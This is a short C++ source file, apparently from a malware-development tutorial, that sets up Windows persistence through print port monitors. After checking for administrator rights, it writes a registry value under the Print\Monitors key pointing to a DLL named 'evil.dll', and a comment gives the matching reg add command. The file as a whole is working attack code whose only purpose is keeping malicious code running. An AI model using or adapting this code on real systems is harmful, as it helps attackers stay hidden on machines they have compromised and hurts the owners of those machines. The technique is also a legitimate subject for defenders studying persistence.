/*
pers.cpp
windows persistence via port monitors
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2022/06/19/malware-pers-8.html
*/
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

// check for admin rights
bool isUserAdmin() {
  bool isElevated = false;
  HANDLE token;
  TOKEN_ELEVATION elev;
  DWORD size;
  if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
    if (GetTokenInformation(token, TokenElevation, &elev, sizeof(elev), &size)) {
       isElevated = elev.TokenIsElevated;
    }
  }
  if (token) {
    CloseHandle(token);
    token = NULL;
  }
  return isElevated;
}

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  if (!isUserAdmin()) {
    printf("please, run as admin.\n");
    return -1;
  }

  // subkey
  const char* sk = "\\System\\CurrentControlSet\\Control\\Print\\Monitors\\Meow";

  // evil DLL
  const char* evilDll = "evil.dll";

  // startup
  // res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"\\System\\CurrentControlSet\\Control\\Print\\Monitors\\Meow", 0 , KEY_WRITE, &hkey);
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)sk, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_QUERY_VALUE, NULL, &hkey, NULL);
  if (res == ERROR_SUCCESS) {

    // create new registry key
    // reg add "HKLM\System\CurrentControlSet\Control\Print\Monitors\Meow" /v "Driver" /d "evil.dll" /t REG_SZ
    RegSetValueEx(hkey, (LPCSTR)"Driver", 0, REG_SZ, (unsigned char*)evilDll, strlen(evilDll));
    RegCloseKey(hkey);
  } else {
    printf("failed to create new registry subkey :(");
    return -1;
  }
    return 0;
}
